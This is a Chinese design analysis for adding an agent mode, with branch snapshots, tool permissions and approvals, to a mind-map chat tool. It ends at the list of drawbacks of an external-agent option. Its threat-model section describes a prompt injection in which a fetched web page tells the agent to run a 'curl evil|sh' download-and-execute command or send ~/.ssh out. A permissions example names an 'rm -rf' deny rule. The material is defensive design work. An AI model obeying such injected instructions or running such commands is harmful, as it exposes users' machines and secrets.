# chatable：「思维导图树 + Agent」扩展方案分析

> 基于 `/home/box/chatable` main @ `268fd8c` 的只读分析，未改动仓库。文中行号均对应这个提交。

---

## 0. 结论先行

- **能扩展，而且这套框架挺适合当 agent 底座。** 树存储（append-only JSONL，任意节点可分叉）、后台线程加 SSE 断线重连、原生 OpenAI tool-calling 循环、按路径重建上下文且保证前缀字节稳定（缓存命中），这几块都是现成的。缺的是：①有副作用的工具；②工具步骤没有作为节点逐步落盘；③文件系统状态没有和树节点绑定；④权限审批；⑤适合长任务的上限和压缩策略。
- **最难的是树的分支和唯一一份真实文件系统怎么对上。** 推荐用 **影子 git 仓库**：GIT_DIR 放在数据目录里，不碰用户项目自己的 `.git`。每个有写操作的步骤落一个快照 commit，节点里记下 `ws_commit`。切分支、回滚就是把工作区恢复到那个节点的快照。要并行跑多个分支时，再给每个分支开一个 `git worktree`。shell 在工作区以外造成的副作用回滚不了，必须在 UI 上标出来。
- **推荐自建一个轻量 agent loop（从 `_generate_unified` 重构出来），不建议一开始就把 kimi-code 或 Claude Agent SDK 整个嵌进来。** 原因是这个产品的核心价值在于「每一步都是树上一个能分叉、能回滚、能对比的节点」，外部 agent 的会话是线性的、状态也在它自己手里，很难在任意一步分叉。外部 agent（`kimi acp`）适合放到后期，当作一种「外包子任务节点」接进来。
- 路线分 P0 到 P5 六个阶段，每个阶段都能单独交给 kimi code 做、单独验收，见第 6 节。

---

## 1. 现有架构里能复用的部分，以及具体限制

### 1.1 树存储（`models.py` + `jsonl_store.py`）

**能复用的：**
- `Node`（models.py:12-26）字段很精简：`id / role / content / parent_id / metadata / pinned / summary / title`。`metadata` 是任意 dict，加新信息不用改表结构。
- `JsonlTreeStore` 每个会话一个文件（trunk），写入只追加（`_append` jsonl_store.py:277），读的时候同一节点以最后一行为准，脏行多了会自动压缩重写。这非常适合 agent 这种高频、逐步落盘的场景：一个步骤写一行，进程崩了也不丢已经完成的步骤。
- `path_to_root`（:538）就是「某条分支的完整历史」。`delete_subtree`（:484）可以剪枝。
- 加载时有 `_repair_orphans`（:205），`_dict_to_node`（:309）对未知字段比较宽容，以后改 schema 成本低。`SCHEMA_VERSION = 1`（:54）。

**限制：**
- `Role` 只有 `user / assistant / summary / system_note`（models.py:9）。运行时还会临时造一个 `raw_message`，但不落盘（service.py:1588）。**没有 step 或 tool 节点类型。**
- 写节点内容基本只在一轮结束时发生：`finalize_node`（:411）一次写入正文、usage 和 metadata。

### 1.2 工具循环（`service.py::_generate_unified`，:1781-1983）

**能复用的：**
- 单一流式循环（:1821 `while True`）：每一轮都带着 tools 去流式请求，模型可以边回答边调工具；工具结果以原生 `role=tool` 消息折回上下文（`_canon_assistant_tool_msg / _canon_tool_result_msg` :79/:106，键排序后序列化，保证字节稳定）。
- 停止时没执行的 call 会补 stub 结果（:1966-1971，`_UNEXECUTED_TOOL_OUTPUT`），保证 tool_call_id 不会悬空。这个细节对 agent 很重要，应该保留。
- 上游流断了会自动重试一次（:1835-1874），并发 `reset` 事件。
- `_ToolCallStripper` 和 `_scrub_answer_text` 处理 DeepSeek/Kimi 把工具调用当文本吐出来的情况（:412、:395）。

**限制（对 agent 来说都是硬伤）：**

| 问题 | 位置 | 影响 |
|---|---|---|
| 每轮最多 3 个新调用，最多 10 轮 | :1888 `len(fresh) >= 3`；:51 `AUTO_TOOL_MAX_ROUNDS=10` | 编码 agent 一个任务通常要 30 到 200 步，10 轮远远不够。到上限后强制不带工具再答一轮。 |
| **整轮内对调用去重** | :1879-1887 `seen_tool_calls` | 对 agent 是错的：改完代码再跑一次 `pytest`、改完再读一次同一个文件，参数完全一样，都是合理的，现在会被直接丢掉。 |
| 工具串行、同步执行 | :1929 `TOOL_REGISTRY.run(...)` 直接在 turn 线程里调 | 没有统一超时；只有 web 工具自己有超时。 |
| 停止是协作式的 | `_LiveTurn.request_stop`（:146）只设一个标志，循环在 chunk 之间和工具之间检查 | 正在跑的工具打断不了。如果加 shell，必须能杀进程组。 |
| 工具记录只在一轮结束时落盘 | `_finalize_turn` :2012-2022，`tool_results`/`tool_messages` 写进 assistant 节点的 metadata | 一个 20 分钟的 agent 任务中途服务重启（daemon 线程 :1765），所有步骤全丢，assistant 节点只剩空正文。流式正文也不是增量落盘的（`append_content` 只在出错时用，:1872）。 |
| 工具步骤不是节点 | 注释写明了 "Tool results are NOT tree nodes"（:1793） | 没法从第 k 步分叉或回滚，思维图上也看不到步骤。 |
| 只有一种模式 | `TOOL_REGISTRY` 是全局单例（tools.py:298） | 不能按会话或模式开关不同工具集。 |

### 1.3 工具注册（`tools.py`）

- `ToolSpec`（:21）已经有 `read_only: bool = True` 字段，但**没有任何地方读它**，正好拿来接权限模型。
- `ToolRegistry.run`（:176）会校验参数、截断输出（`result_max_chars`）、捕获异常，这套契约可以保留。只是 handler 签名是同步的 `dict -> WebToolResult`，需要扩展成能拿到「执行上下文」（工作区、取消令牌、流式输出回调、审批）。
- `decision_prompt`（:87）和 `main.SYSTEM_PROMPT`（main.py:38）写死了「read-only tools」和研究助手的定位，agent 模式需要单独一套 prompt。

### 1.4 SSE 与后台执行（`_LiveTurn` / `_LiveTurns`，service.py:118-213；server.py:538-581）

**能复用的：**
- 生成跟 HTTP 连接解耦：后台线程往缓冲区追加事件，`/api/stream/{id}?from=` 可以从任意偏移重放（`read_from` :151），有 15 秒 keepalive。这正是 agent 长任务需要的：关掉页面任务也不停，回来还能接上。
- 多个 turn 可以并发跑在不同分支上（`_LiveTurns` 用 dict 存），这是并行分支的雏形。

**限制：**
- 事件缓冲在内存里，结束 20 秒后就回收（`RETAIN_FINISHED_TURN_S` :54）。服务重启后，进行中的任务只能靠落盘内容恢复，所以步骤必须逐步落盘。
- 事件类型目前只有 `user_node / assistant_node / assistant_start / reasoning / delta / tool_call / tool_result / reset / error / done`，还需要加步骤、审批、diff、快照相关事件。
- 没有「等待人工输入」这种状态，turn 线程只会一路跑完。

### 1.5 上下文与压缩（`main.py::build_context`，:916-969）

**能复用的：**
- 上下文 = 根到当前节点的路径（`_live_context` service.py:1609），加上 pinned 节点。同一个祖先下的多个分叉，发给模型的前缀**字节完全一致**，缓存可以命中（`_expand_path` 的注释 :1566-1575）。这是「树 + agent」最大的成本优势：从第 k 步分叉出 5 个尝试，前 k 步只付一次 prefill 的钱。
- 截断时不会把孤立的 `role=tool` 消息留在窗口开头（:937-945）。

**限制：**
- **所谓「压缩」其实不是 LLM 摘要。** 路径超过 80 条（`CONTEXT_MAX_PATH_MESSAGES` main.py:367）时保留最近 24 条（:368），其余每条只留一行最多 220 字符的摘录（`_node_excerpt` :801）。agent 每一轮会产生 1+N 条消息，十几轮就会触发；触发后前面读过的文件内容、计划、决策全部只剩 220 字的摘录，agent 会「失忆」并重复劳动。
- 预算按条数算，不按 token 算。估算是 `len // 4`（:957），对中文和代码都偏差很大。
- `Role` 里有 `summary`，`build_context` 也会把 summary 节点放进上下文，但目前没有任何代码会生成这种节点。正好可以拿来做「持久化压缩摘要节点」。

### 1.6 模型接入（`main.py`）

- 只有 OpenAI 兼容的 Chat Completions（`_openai_stream` :1028，`stream_backend` :1126），支持原生 tools、reasoning、显式 cache_control（:900）。DeepSeek、Kimi、Qwen、OpenRouter 都能直接用，对 agent 够了。
- 每一轮都把完整消息发给 API，没有服务端会话状态。这对树结构正好有利：任意节点都能重建上下文。

### 1.7 前端思维图（`static/index.html`）

- 思维图把一问一答配成一张卡片：`buildPairTree`（:2581）→ `layoutMindmap`（:2535），卡片带 `q/a/replyId`，用 SVG 画连线，支持平移、缩放、搜索、定位中心。
- 工具调用是消息内部的一个列表（:337 `streams[m.id].tools || m.tool_results`）。SSE 事件在 :3353-3400 统一分派。
- 输入框上的「Forking from #xxxx」和旁边的思维图按钮在 :459-464。
- **限制：** 配对逻辑默认 user 的子节点就是 assistant；如果插入 step 节点，`buildPairTree` 必须改成能把 step 链折叠进卡片。整个前端是一个 3400 行的 Alpine 单文件，再加 diff 渲染和审批卡片之前，建议先把 agent 相关组件拆到 `static/js/` 里（已经有一个 `ui-enhancements.js` 作先例）。

### 1.8 安全层（`server.py::SecurityMiddleware` :137；`web_tools.local_path_allowed` :645）

- 有 Host 白名单、Origin/Referer 防 CSRF、可选 token（**默认关闭**）。header 都不带的请求只放行 loopback。
- `local_path_allowed` 只允许读 uploads/ 和 images/（`register_local_read_root` :616，service.py:530）。
- **加了 shell 以后，威胁模型完全变了：** 现在「本机任何进程或用户能访问 127.0.0.1:端口」最多泄露聊天记录；有了 shell 就是**本地任意代码执行**。所以 agent 模式下 token 必须强制开启，见 4.4。

---

## 2. 「树 + Agent」的核心设计

### 2.1 节点应该代表什么

三种粒度对比：

| 粒度 | 优点 | 缺点 |
|---|---|---|
| 一问一答（现状） | 思维图干净 | 不能从中间某一步分叉或回滚 |
| 每个 tool call 一个节点 | 最细 | 一个 assistant 消息里的多个 tool_calls 必须跟着连续的 tool 结果，拆开以后上下文重建很别扭；思维图会被淹没 |
| **每个模型轮次（round）一个 step 节点** ✅ | 跟 API 消息结构一一对应：一条 assistant 消息（含 0..N 个 tool_calls）加上它的 N 个 tool 结果 | 需要在思维图里折叠 |

**推荐的结构**（role 扩展为 `step`，可选 `plan` 和 `summary`）：

```
user ──► step#1 ──► step#2(edit) ──► step#3(shell) ──► assistant(最终回答)
                 └► step#2'(另一种改法) ──► ...      ← 从 step#1 分叉
```

- `step.metadata = { messages: [assistant_msg, tool_msg...], calls: [{name,args,ok,duration,permission}], status: running|awaiting_approval|done|denied|interrupted, ws_commit, ws_parent_commit, diffstat, side_effects: [...], tainted: bool }`
- `messages` 里存的就是现在 `tool_messages` 的那份规范化 JSON。`_expand_path` 遇到 step 节点时原样展开，缓存字节稳定这个性质完全保留。
- assistant 节点仍然是一轮的「最终回答」，思维图的卡片还是 user 配 assistant，中间的 step 链折叠成卡片里的一条迷你时间线（比如 `✎3 ▶2 ✓`），点开再展开。
- **老数据不用迁移：** 旧的 assistant 节点 metadata 里的 `tool_messages` 继续走现有的回放分支（:1580）。新数据才用 step 节点。`SCHEMA_VERSION` 升到 2，加载时兼容 1。

### 2.2 分支在 agent 里对应什么

真正有价值的：
1. **从任意一步回滚重试。** 「第 3 步改错方向了」→ 在 step#2 上分叉，附一句引导（"别改 X，改 Y"），工作区自动恢复到 step#2 的快照。这比 Claude Code 的 `/rewind` 更直观，因为能看到整棵历史，旧分支也不会丢。
2. **同一问题多方案对比。** 在同一个节点下开 2 到 3 个兄弟分支（不同 prompt 或不同模型），每个分支有自己的快照链。对比两个分支的最终 diff 和测试结果，再选一个「采纳」。前缀共享缓存，成本可控。
3. **审批就是树上的一个挂起节点。** `awaiting_approval` 的 step 在思维图上直接高亮，批准、拒绝、改参数后批准都在节点上点。拒绝也是一种分支：被拒的调用保留在树里，模型收到 "denied" 结果后继续。
4. **子 agent 就是子树。** 主 agent 调用 `delegate(task)`，生成一个 `task` 节点，它的子树用全新的上下文（任务描述加必要文件），跑完以后把摘要作为 tool 结果返回给父步骤。子树在思维图上可以折叠，展开就能审查子 agent 每一步做了什么。这比 Claude Code subagent 那种只回传结果、过程不可见的黑盒更透明。
5. **计划节点。** `plan` 节点存 todo 列表，后续的 step 引用 todo 项。思维图可以按 todo 着色。可以有，但优先级不高。

偏噱头、建议不做或延后：
- 把每个工具调用都画成思维图上的一个独立大节点：噪音太大，几十步的任务会让图不可读。
- 默认自动展开 N 个并行分支，或做「LLM 自评的树搜索」（类 MCTS）：没有测试这种客观信号时，模型自评不可靠，而且 token 成本成倍增长。只建议在用户手动触发、并且有可执行的验收命令（比如 `pytest`）时才做。
- 自动合并多个分支的代码：冲突处理复杂，收益有限。用「采纳其中一个分支加手动 cherry-pick」就够了。

### 2.3 现有编码 agent 的做法（只挑相关的）

| 工具 | 回滚 / 检查点 | 子 agent / 并行 | 权限 |
|---|---|---|---|
| Claude Code | 编辑工具改动的文件会自动建检查点，`/rewind`（Esc Esc）可以回退代码和/或对话；**bash 造成的改动不追踪** | Task 子 agent 有独立上下文，只回传结果 | 有 default / acceptEdits / plan / bypass 几种模式，加上按工具的 allow/ask/deny 规则 |
| Codex CLI | 主要靠 git；新版有基于 git 的快照撤销 | — | 审批模式（只读 / 自动 / 完全访问），加 OS 级沙箱（macOS Seatbelt、Linux Landlock+seccomp），默认禁网 |
| Cline（VS Code） | **影子 git 仓库**，每一步一个 checkpoint，可以对比、恢复「仅文件」或「文件加对话」 | — | 每个动作审批或自动批准 |
| Aider | 每次编辑自动 git commit，`/undo` | — | 弱 |
| OpenHands | 事件流（Action/Observation）全量记录，Docker 沙箱运行时 | 有委托子 agent | 沙箱隔离 |
| kimi-code 2.2 | 会话可以 `kimi fork`（整个会话复制一份） | 有 agent profile | 有 Ask When Needed（`-y`）、Never Ask（`--auto`）、plan 模式 |

启示：**Cline 的影子 git 和 OpenHands 的事件流最接近「树 + agent」**，chatable 等于把它们的「线性检查点」推广成「树状检查点」。这是现有工具都没做好的差异化点，Claude Code 的 rewind 是线性的，回退以后旧路径就看不到了。

---

## 3. 最难的问题：树分支 vs 唯一的真实文件系统

### 3.1 可选方案

| 方案 | 分叉 / 回滚 | 成本 | 问题 |
|---|---|---|---|
| A. 每个分支一个 `git worktree` | 分支天然隔离 | 每个分支一个目录，大仓库占磁盘；node_modules、venv 要重装 | 分支很多时目录会爆炸 |
| **B. 影子 git：每步一个快照 commit** ✅ | 回滚就是 checkout 快照，分叉就是从某个 commit 继续 | commit 只存增量，很便宜 | 只能追踪工作区里的文件；同一时刻只有一个分支是「活的」 |
| C. 写时复制（APFS clone / overlayfs / btrfs reflink） | 快 | 跟平台强绑定（Mac 用 APFS clonefile，Linux 用 overlay） | 实现复杂，跨平台麻烦 |
| D. 每个分支一个容器沙箱 | 隔离最彻底，shell 副作用也能隔离 | 重；用户本地要装 Docker；构建环境要配置 | MVP 太重 |

### 3.2 推荐：B 为主，A 用于并行，D 作为 shell 的可选加固

**机制：**
- 工作区（workspace）跟 trunk 绑定：trunk 节点的 metadata 里记 `workspace: {id, path}`。影子仓库放在 `<data_dir>/workspaces/<ws_id>.git`，用 `git --git-dir=<影子> --work-tree=<项目>` 操作，**不碰用户自己的 `.git`**（Cline 也是这么做的）。exclude 规则沿用项目的 `.gitignore`，再额外排除 `.git/`、大文件，以及数据目录本身。
- 每个 step 执行写工具或 shell **之前**先记 `ws_parent_commit`（也就是当前 HEAD）；**之后**执行 `add -A && commit`（没变化就跳过），把新 commit 记进 `step.metadata.ws_commit`。每个节点的「文件状态」等于沿路径往上找到的最近一个 `ws_commit`。
- **切换分支 / 回滚：** 用户在思维图上选中节点 N 并「从这里继续」时，计算 N 的快照 S，和工作区当前的 HEAD 比较：
  1. 先查工作区有没有脏（用户手动改过文件）：有的话先建一个 `external_change` 快照节点（或者弹窗让用户选「保留 / 丢弃 / 带过去」），绝不默默覆盖用户的改动。
  2. `git read-tree -um S`（或 `checkout S -- .`，再删掉 S 里不存在的已追踪文件）。
  3. 更新「活分支指针」`workspace.active_node = N`。
- **分叉：** 新的 step 以 N 的快照为父 commit 继续提交。影子仓库里的 commit 图就是对话树的一个投影。
- **对比分支：** `git diff S_a S_b`，直接在 UI 上渲染。
- **采纳分支：** 把工作区切到该分支的叶子快照，然后提示用户在自己的真实 git 里提交（也可以提供「生成 patch / 在真实仓库建分支」按钮）。
- **并行跑多个分支：** 同一个工作区同一时刻只允许一个活分支写入（加锁）。用户要并行时，给每个并行分支建一个 `git worktree add <data_dir>/worktrees/<node>`（基于影子仓库的快照），分支结束后可以采纳回主工作区。这是 P5 的事。

**副作用分级（必须在 UI 上可见）：**
- 能回滚：工作区内的文件改动，包括 shell 在工作区内造成的改动，因为快照会抓到。
- **回滚不了：** 工作区外的写入、`pip install` 或全局安装、网络请求（发帖、部署、调 API）、数据库、git push、杀进程。step 节点标 `side_effects` 和 ⚠，回滚时明确提示「这些操作没法撤销」。命令分类可以用规则（匹配命令前缀），不确定的一律当作不可逆。
- 被 gitignore 的文件（`.env`、`node_modules`、构建产物）不在快照里，回滚时不会恢复，UI 上要说明。

**为什么不直接选 D：** chatable 是本地桌面式工具（从 Clash fake-IP 那个需求看，你是在自己机器上跑），要求装 Docker 门槛太高。但 shell 可以做成可选沙箱：Linux 用 `bwrap`，macOS 用 `sandbox-exec`，配置为工作区可写、其他目录只读、默认禁网。放在 P3 之后加固。

---

## 4. 工具层设计

### 4.1 工具集（agent 模式）

| 工具 | 说明 | 默认权限 |
|---|---|---|
| `list_dir(path, depth)` | 工作区内目录树，尊重 .gitignore | auto |
| `read_file(path, offset, limit)` | 带行号、分页；拒绝二进制和大文件 | auto |
| `search(pattern, glob, path)` | 调用 `rg --json`，限制结果条数 | auto |
| `edit_file(path, old_str, new_str, replace_all)` | **精确字符串替换**（Claude Code / kimi 的做法），old_str 不唯一就报错；返回 unified diff | ask（可切换到 auto） |
| `write_file(path, content)` | 新建或整体覆盖，返回 diff | ask |
| `shell(cmd, timeout, cwd)` | cwd 限定在工作区内，独立进程组，超时 120 秒；stdout 流式推给前端；输出截断（保留头尾） | ask；可配置命令白名单（如 `pytest`、`git status`、`rg`）为 auto |
| `delegate(task, tools)` | 起一个子 agent 子树 | ask（P5） |
| `web_search / web_fetch / grep` | 沿用现有 | auto，但会**污染分支**，见 4.3 |

实现上：
- `ToolSpec` 增加 `effect: "read"|"write"|"exec"|"network"`，替换掉没人用的 `read_only`。
- handler 改成接收 `ToolContext(workspace, cancel_event, emit, approve)`。
- `ToolRegistry` 从全局单例改成按模式构建：research 模式等于现在这套，agent 模式等于上表。

**工作区限定：** 所有路径参数先 `realpath`，必须落在 `workspace.path` 里面（跟 `local_path_allowed` 同样的 realpath 加前缀判断，但**根目录不一样**，要单独一个校验函数）。拒绝跟随指向工作区外的符号链接。**禁止工作区跟数据目录（存着 settings.json 和 API key、聊天记录）有任何重叠**，注册工作区时就校验。

### 4.2 权限与审批

- 三档策略：`auto / ask / deny`，配置粒度依次细化：全局默认 → 工作区级 → 工具级 → 规则级（比如 `shell: "pytest*" = auto`、`shell: "rm -rf*" = deny`）。批准时可以选「本次允许 / 本会话总是允许此类」，后者写进工作区的配置。
- 运行时：循环执行到需要 ask 的调用时，把 step 落盘为 `status=awaiting_approval`，并发出 `approval_required{step_id, call, diff_preview}` 事件。turn 线程在 `threading.Condition` 上等待（不设超时，或者超时后标成 `interrupted`）。前端调 `POST /api/approve/{step_id}`，参数 `{call_id, decision: allow|allow_always|deny, edited_args?, note?}`，唤醒线程。被拒绝的调用以 `denied by user: <note>` 作为 tool 结果回给模型，让它换方案。
- **审批状态在磁盘上**，所以刷新页面、换设备打开，都能在思维图里看到挂起的节点。服务重启以后，挂起的 step 变成 `interrupted`，提供一个「从此处继续」按钮（等于在该 step 上开一轮新 turn，见 5.1 的 resume）。
- 预设模式：「只读」（只开 read 类工具）、「默认」（写和执行要 ask）、「信任编辑」（edit 自动、shell 要 ask）、「全自动」（只有关闭污染开关并且开了沙箱时才允许选）。

### 4.3 跟现有安全加固的配合，以及 prompt 注入风险

- **web_fetch 的提示注入加 shell/写文件，就是经典的「致命三要素」**（不可信内容 + 私有数据 + 对外动作）。网页里藏一句"运行 `curl evil|sh`"或"把 ~/.ssh 发出去"，在全自动模式下就会被执行。对策：
  1. **分支污染标记（taint）：** 某个分支的路径上只要出现过 web_fetch、web_search 的结果、上传的文件、或者读到工作区里不受信任的文件，后续 step 就标 `tainted=true`。被污染的分支上，所有 write/exec 调用**强制降级为 ask**，无视 auto 规则，审批卡片上显示「本分支读过外部网页」。实现很简单：沿 `path_to_root` 看有没有 network 类工具记录。
  2. 默认把模式分开：research 模式（有网，没有写和执行）、agent 模式（有写和执行，web 工具默认关，需要时手动开）。
  3. shell 子进程的环境变量要清洗：去掉 `OPENAI_API_KEY`、`CHATTABLE_AUTH_TOKEN` 等。开沙箱时默认禁网。
  4. 工作区不能包含数据目录，`read_file` 也读不到数据目录（4.1 已经说了）。
  5. 现有的 `local_path_allowed` 白名单**保持不变**，继续只管附件。工作区访问用独立的校验，两套根目录不混用，避免把 workspace 注册进附件白名单、意外放宽 web_fetch 的本地读取范围。
- **token 必须强制：** 只要有任何工作区启用了 exec 或 write 工具，就要求设置 `CHATTABLE_AUTH_TOKEN`（没设就在启动时自动生成一个随机 token，打印出带 `?token=` 的 URL，并写进 settings.json）。原因是现在「loopback 不带头的请求直接放行」（server.py:137-148 的规则 3），本机任何进程都能调 `/api/send` 让 agent 执行 shell，等于本地提权或执行任意代码的通道。
- 新增的工作区注册、审批、checkout 接口都按「敏感写操作」走 Origin 校验。`/api/fs/list`（server.py:583）现在能列任意目录，用作工作区选择器可以，但在 agent 模式下要求 token。

---

## 5. 各文件和模块要改什么

### 5.1 `service.py`：把循环重构成 AgentLoop

- 把 `_generate_unified`（:1781-1983）里「一轮流式 → 解析调用 → 执行 → 折回」抽成 `agent_loop.py::AgentLoop`，参数包括：`mode`（research/agent）、`registry`、`limits`（max_rounds、max_calls_per_round、max_wall_time、token 预算）、`policy`（权限）、`workspace`。research 模式的参数跟现在一致（3 个调用、10 轮、去重），**行为和字节稳定性不变**，用现有测试兜底。
- agent 模式下：
  - 每轮调用上限放宽到大约 8 个，最大轮数 100 左右，外加墙钟时间和 token 预算的熔断。
  - **去掉对 write/exec/read_file 的去重**，只对 web 类做去重，或者改成「连续 3 次完全相同就提示模型陷入循环」。
- **每一轮落一个 step 节点：** 轮次开始时 `store.add(step)`（status=running），结束时 `finalize_node`。下一轮的 parent 是上一个 step。最终回答的 assistant 节点挂在最后一个 step 下面。现在「先建一个空的 assistant 节点给 UI 当稳定 id」的做法（:1709）要改：UI 用 turn id 订阅，assistant 节点在最后才建；也可以提前建好，最后再 reparent。**建议后者不做**：store 没有 reparent，加进去会破坏「节点一辈子属于同一个 trunk」的不变量（jsonl_store.py 头部注释）。
- `_expand_path`（:1565）：遇到 step 节点就展开 `metadata.messages`，复用现有的 `raw_message` 路径（:1588-1597）。
- **resume：** `start_turn(content="", parent_id=<step或interrupted节点>, mode="agent", continue=True)` 不新建 user 节点，直接从该节点的上下文继续跑。
- **取消：** 给 `_LiveTurn` 加 `cancel_event: threading.Event`，传进 `ToolContext`。shell 用 `subprocess.Popen(start_new_session=True)`，取消时 `os.killpg`。
- 工具并发：同一轮里的只读调用可以用线程池并行，写和执行严格串行。
- **压缩：** 新增 `compact(node_id)`：路径 token 超阈值时调用摘要模型，生成一个 `summary` 节点**插在路径上**（作为最新 step 的子节点，后续 step 挂在它下面）。`build_context` 遇到 summary 节点就丢弃它之前的消息，只保留摘要。不同分支各自压缩，互不影响，这一点树结构天然支持。同时把按条数截断（main.py:930）改成按 token 预算截断。

### 5.2 `jsonl_store.py` / `models.py`

- `Role` 增加 `"step"`（以及 P5 的 `"task"`、`"plan"`）。`SCHEMA_VERSION = 2`。`_dict_to_node` 遇到未知 role 时降级为 `system_note` 只读显示，保证老版本打开新数据不崩。
- 新增 `update_status(nid, status, extra)`，就是追加一行。step 的输出流（shell stdout）**不要**每个 chunk 都落盘，只在 step 结束时写；运行中的内容走 SSE。
- 加一个辅助方法 `nearest_ws_commit(nid)`：沿路径往上找 `ws_commit`。
- 迁移：不需要改写老文件。v1 数据原样可读，新字段都是可选的。

### 5.3 新模块

- `workspace.py`：工作区注册和校验（realpath、跟数据目录不重叠），影子 git 封装（`init / snapshot / restore / diff / is_dirty / worktree_add`），活分支指针和写锁。
- `agent_tools.py`：list_dir、read_file、search、edit_file、write_file、shell 的 handler，加 `ToolContext`。
- `policy.py`：auto/ask/deny 规则匹配、污染判定、命令副作用分类。
- `agent_loop.py`：见 5.1。

### 5.4 `server.py` 新接口

| 接口 | 用途 |
|---|---|
| `POST /api/workspaces` / `GET /api/workspaces` / `DELETE /api/workspaces/{id}` | 注册、列出、解绑工作区（需要 token） |
| `POST /api/trunk/{id}/workspace` | 把会话绑定到工作区 |
| `POST /api/send` 增加 `mode`、`continue` 字段 | 启动 agent turn 或 resume |
| `POST /api/approve/{step_id}` | 审批 |
| `GET /api/step/{id}/diff` | 该步的 diff（`ws_parent_commit..ws_commit`） |
| `POST /api/checkout/{node_id}` | 把工作区恢复到节点的快照（先做脏检查，返回 conflict 让前端弹窗） |
| `GET /api/compare?a=&b=` | 两个节点快照之间的 diff，加文件列表 |
| `GET/POST /api/workspaces/{id}/policy` | 权限规则 |

`SecurityMiddleware`：一旦有工作区启用了 exec/write，就强制要求 token（见 4.3）。

### 5.5 SSE 新事件

`step_start{id,parent_id,round}`、`step_output{id,call_id,chunk}`（shell 流式输出）、`approval_required{step_id,call_id,name,args,diff_preview,tainted}`、`approval_resolved{...}`、`file_diff{step_id,path,diff}`、`checkpoint{step_id,commit,diffstat}`、`step_done{id,status}`、`compacted{summary_id}`、（P5）`subagent_start/done`。旧事件保留，research 模式的前端不受影响。

### 5.6 前端（`static/index.html`，建议拆出 `static/js/agent.js`）

- **对话视图：** assistant 消息上方渲染 step 时间线。每个 step 可以折叠，展示调用、参数、输出；edit/write 用 diff2html 或自写的轻量 unified diff 渲染。shell 显示流式终端输出和退出码。`awaiting_approval` 显示审批卡片（允许 / 总是允许 / 拒绝加备注 / 编辑参数）。
- **思维图：**
  - `buildPairTree`（:2581）改成：user 往下沿着 step 链走到 assistant 合成一张卡片，step 链折叠成卡片底部的徽标（✎ 编辑数、▶ 命令数、+/- 行数、⚠ 不可逆、⏸ 待审批）。
  - 从 step 分叉出来的兄弟分支在图上显示为从卡片中部长出的边，需要给卡片加「展开步骤」模式。
  - 节点右键加：「回到此处继续（恢复文件）」「对比另一个分支」「采纳此分支」。
  - 当前工作区活分支的节点要高亮，这样一眼能看出文件状态对应哪个节点。
- **输入框：**
  - 「Forking from #xxxx」旁边加上模式切换（研究 / Agent）和工作区选择。
  - 如果 fork 的节点不是当前活分支，发送前提示「将把工作区恢复到 #xxxx 的状态」。
- **设置：** 工作区管理，权限预设，命令白名单。

---

## 6. 分阶段路线（每阶段都可以单独交给 kimi code）

> 规模是粗估（新增或修改的行数，含测试），「轮」指让 kimi 改一次加我审一次。

### P0：循环重构（S，约 400 行，1 到 2 轮）
- 抽出 `AgentLoop` 和 `limits`/`mode` 参数；工具注册改成按模式构建；`ToolSpec.effect`；`ToolContext`（cancel_event）；只读调用并行。
- **research 模式行为不变。**
- 验证：现有 196 个测试全过；新增测试断言 research 模式两轮请求前缀的哈希跟重构前一致；实际跑一次 DeepSeek 的搜索问答。

### P1：工作区 + 只读代码工具（M，约 600 行，2 轮）
- `workspace.py` 注册和校验；trunk 绑定工作区；`list_dir / read_file / search(rg)`；agent 模式加系统 prompt；启用 agent 时强制 token。
- 验证：路径穿越（`../`、绝对路径、符号链接逃逸）测试；读不到数据目录和 settings.json；工作区跟数据目录重叠时拒绝注册；没有 token 时 agent 模式拒绝启动；实际问一句「这个仓库的路由在哪」。

### P2：step 节点 + 写工具 + 快照 + 审批（L，约 1200 行，3 到 4 轮，**最核心**）
- `Role="step"`、schema v2、逐轮落盘；`edit_file / write_file` 返回 diff；影子 git 快照；`awaiting_approval` 的阻塞和唤醒机制，`/api/approve`；前端 step 时间线、diff 渲染、审批卡片；`_expand_path` 展开 step。
- 验证：
  - 任务跑到一半 kill 服务，已完成的 step 还在，可以 resume。
  - 审批挂起时刷新页面，卡片还在；拒绝以后模型能换方案。
  - 快照 commit 只出现在影子仓库，用户的 `.git` 没被碰。
  - 老会话照常打开、照常续聊。
  - 新会话里连续两轮的缓存前缀一致。

### P3：shell 执行 + 污染策略（M，约 700 行，2 到 3 轮）
- `shell` 工具：进程组、超时、流式输出、清洗环境变量、cwd 限定；命令规则（白名单 auto、黑名单 deny）；不可逆副作用分类加 ⚠；分支污染以后强制 ask。
- 验证：点停止能杀掉 `sleep 100` 以及它的子进程；造一个藏了注入指令的测试网页，fetch 之后 shell 调用必须弹审批；子进程里看不到 API key；`pytest` 能连续跑多次（不被去重）。

### P4：树操作 = 文件时光机（M，约 800 行，2 到 3 轮）
- `/api/checkout`（带脏检查和外部改动快照）、`/api/compare`、采纳分支；思维图上的 step 徽标、活分支高亮、「回到此处继续」「对比」；fork 时自动恢复文件。
- 验证：A 分支改文件 → 切到 B 分支，文件恢复成 B 的状态 → 再切回 A 又恢复；手动改过工作区以后切分支会提示，不会丢改动；compare 的 diff 跟 `git diff` 一致。

### P5：长任务与多 agent（L，约 1500 行，分 3 个子任务）
- 5a：LLM 压缩摘要节点，按 token 预算组装上下文。
- 5b：plan/todo 节点。
- 5c：`delegate` 子 agent 子树；用 worktree 并行跑兄弟分支，最后采纳其中一个。
- 验证：100 轮以上的任务上下文不爆，压缩后能继续做；两个并行分支互不干扰；子 agent 的摘要正确回传。

### P6（可选）：外部 agent 适配器
- 把 `kimi acp` 当作一种「外包任务节点」：给它一个工作区快照（worktree）和任务描述，ACP 的 session 更新事件映射成只读的 step 子节点，结束时在 worktree 上做快照，回到树里供对比和采纳。

---

## 7. 另一条路：直接接一个现成的 agent，诚实评估

### 方案 X：通过 ACP 驱动 kimi-code（本机 `kimi` 2.2.0 有 `kimi acp`，走 stdio 的 Agent Client Protocol）
**优点：**
- 马上就有成熟的 agent 能力：编辑工具、shell、计划、子 agent、上下文压缩、权限模式（`-y`、`--auto`、`--plan`）都是现成的，体验和模型调优比自己写的好很多。
- ACP 是标准协议（Zed 等编辑器在用）。协议里有权限请求（`session/request_permission`）、工具调用更新、文件读写回调这些标准消息，能映射到审批 UI。理论上将来还能换成别的 ACP agent，比如 Claude Code 的 ACP 适配器、Gemini CLI。
- 开发量小：一个适配器加前端渲染，大约 1000 行就能有可用的 MVP。

**缺点（对「树」来说是根本性的）：**
